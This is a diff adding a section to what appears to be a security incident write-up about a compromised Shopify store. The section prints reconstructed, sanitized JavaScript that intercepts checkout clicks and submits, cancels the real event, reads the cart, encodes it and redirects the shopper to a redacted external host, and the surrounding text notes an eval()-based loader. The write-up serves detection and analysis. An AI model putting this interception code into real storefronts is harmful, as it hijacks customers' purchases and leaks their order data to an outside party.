@@ -70,6 +70,39 @@ fetch('/pages/ymq-r-26b76f38fd?v=26b76f38fd')
   });
 ```
 
+The loader was only the delivery mechanism. The reconstructed checkout logic below shows the next stage of the attack. It is intentionally sanitized and simplified; it is not a verbatim copy of the captured payload:
+
+```javascript
+const redirectTarget = 'https://[redacted]/';
+
+async function interceptCheckout(event) {
+  const element = identifyCheckoutElement(event);
+  if (!element) return;
+
+  event.preventDefault();
+  event.stopImmediatePropagation();
+
+  const cart = await fetch('/cart.js').then(response => response.json());
+  const order = normalizeCart(cart);
+  const context = {
+    site: location.hostname,
+    sourceUrl: location.href,
+    order
+  };
+
+  const redirect = new URL(redirectTarget);
+  redirect.searchParams.set('co', encodeBase64Url(context));
+  window.name = '__CHECKOUT_CONTEXT__:' + JSON.stringify(context);
+  location.assign(redirect.href);
+}
+
+window.addEventListener('pointerdown', interceptCheckout, true);
+window.addEventListener('click', interceptCheckout, true);
+window.addEventListener('submit', interceptCheckout, true);
+```
+
+This illustrates why the incident was more serious than a broken checkout button. The payload operated at the browser boundary, cancelled the legitimate Shopify event, read cart contents, serialized the shopping context, and redirected the customer to an external destination. The exact captured payload used different helper names and additional fields; those details are omitted here to keep the example useful for detection without republishing the complete attack artifact.
+
 This pattern is high risk even before considering the specific redirect. It turns a remotely retrievable Shopify Page into executable code through `eval()`. The page does not need to be part of the theme repository, and the attacker does not need to modify a Liquid template if the delivery mechanism can fetch and execute the page at runtime.
 
 The reconstructed payload used an external redirect destination, encoded cart information into URL parameters, and set `window.name` before navigation. The observed indicators included:
